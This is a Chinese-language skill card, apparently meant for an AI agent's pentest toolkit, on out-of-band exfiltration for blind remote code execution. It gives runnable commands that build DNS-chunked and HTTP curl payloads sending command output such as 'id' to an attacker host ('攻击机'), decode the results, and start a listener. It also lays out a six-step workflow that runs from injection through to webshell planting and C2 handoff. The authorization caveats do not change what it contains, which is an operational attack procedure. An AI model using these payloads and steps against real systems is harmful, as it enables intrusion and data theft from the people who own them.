---
name: 无回响
description: >-
  授权 RCE 无回显外带：DNS 分片、HTTP curl 包装、解码 qname。
  触发：DNS 隧道、OOB、无回显 RCE、dnslog。
  默认不绑 53、不洪水。DNSlog ≠ GetShell。
---

# OOB 外带（大爱仙尊）

给无回显 sink 铸载荷。默认 **不监听 53**。  
只算 **primitive**；回显 `uid=` 才交 RCE 卡报 L3。

| 档 | 成立 | 不算 |
|----|------|------|
| primitive | 攻击机看到 DNS/HTTP 外带 | 只生成了 qname |
| L2 | 解码出命令输出片段 | 当 GetShell |
| L3 | 本卡不设，回 `rce-encyclopedia` | 绑 53 对外洪水 |

编码：`序号.总数.hex(data).domain`，默认 chunk 40 hex。

## 立刻跑

```bash
python3 炼蛊房/oob_exfil.py dns --data id --domain oob.lab
python3 炼蛊房/oob_exfil.py http --data id --url http://攻击机:8080/
python3 炼蛊房/oob_exfil.py decode --qname 01.01.6964.oob.lab
python3 炼蛊房/se_listen.py --lport 8080 --case <案>
```

`dns` 打印 queries + `nslookup` 包装。  
`http` 打印 `curl .../$(echo data|base64)`。  
`decode` 还原 hex 段。

## 六步

```text
① 先认形：命令注入 / SSTI / XXE
② 攻击机 se_listen 或自备 DNSLog
③ dns/http 铸载荷，一次一个变量
④ 看到回包再 decode
⑤ 有 uid= 才 rce_forge / 写马
⑥ 禁止把 DNSlog 写成已接管
```

## 交接

| 认到 | 走 |
|------|----|
| 未认形抢 RCE | `rce-encyclopedia` · `rce_family_route.py` |
| 已认命令注入 | `command-injection-testing` · `rce_forge.py shoot` |
| 回连 | `se_listen.py` · `host-c2-verify` |

## 真源

- 手法：`传承/全力以赴-炼法.md` · `专项探府.md`
- 探针：`炼蛊房/oob_exfil.py`
